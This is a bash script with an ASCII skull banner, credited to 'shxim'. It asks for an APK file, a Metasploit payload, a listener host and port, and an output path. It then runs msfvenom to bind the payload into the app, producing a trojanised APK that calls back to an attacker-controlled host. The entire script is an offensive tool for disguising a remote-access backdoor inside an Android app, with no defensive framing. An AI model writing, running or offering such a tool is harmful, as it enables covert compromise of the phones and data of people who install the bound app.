#!/bin/bash
#AUTHOR=shxim
#variables
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
cyan=$(tput setaf 6)
reset=$(tput sgr0)

#auther
AUTHOR()
{
echo -e " $red

                       * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
                       * @@@@@                                        @@@@@    *
                       * @@@@@@@                                      @@@@@@@  *
                       * @@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@  *
                       * @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@    *
                       *     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@         *
                       *       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@           *
                       *         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@             *
                       *            @@@@@@@    @@@@@@    @@@@@@                *
                       *            @@@@@@      @@@@      @@@@@                *
                       *            @@@@@@      @@@@      @@@@@                *
                       *             @@@@@@    @@@@@@    @@@@@                 *
                       *              @@@@@@@@@@@  @@@@@@@@@@                  *
                       *               @@@@@@@@@@  @@@@@@@@@                   *
                       *           @@   @@@@@@@@@@@@@@@@@   @@                 *
                       *           @@@@  @@@@ @ @ @ @ @@@@  @@@@               *
                       *          @@@@@   @@@ @ @ @ @ @@@   @@@@@              *
                       *        @@@@@      @@@@@@@@@@@@@      @@@@@            *
                       *      @@@@          @@@@@@@@@@@          @@@@          *
                       *   @@@@@              @@@@@@@              @@@@@       *
                       *  @@@@@@@                                 @@@@@@@      *
                       *   @@@@@                                   @@@@@       *
                       *                                        $cyan 𝒜𝓊𝓉𝒽ℴ𝓇: 𝓈𝒽𝓍𝒾𝓂 $reset$red*
                       * * * * * * * * * * * * * * * * * * * * * * * * * * * * *$reset
$reset "
}

#payload
payload_setting()
{
  read -p "${yellow}Attach the apk file :" apk
  read -p "Enter the payload here :" pay
  read -p "Enter the lhost :" lhst
  read -p "Enter the lport :" lprt
  read -p "Enter the path to save the payload binded apk :${reset}" path
}
#if
if_stat()
{
  read -p "${red}are you sure want to install [yn]${reset}" ans
  if [[ $ans = y ]]; then
    echo "${blue}˜”*°•.˜”*°• payload creation is started •°*”˜.•°*”˜${reset}"$green
    msfvenom -x $apk -p$pay lhost=$lhst lport=$lprt -o $path
    echo "${blue}˜”*°•.˜”*°• payload creation is finished •°*”˜.•°*”˜${reset}"
  else
    echo "$blue                                                   [𝐄𝐱𝐢𝐭𝐞𝐝 !!!!!]"
  fi
}
#main_script
AUTHOR
payload_setting
if_stat
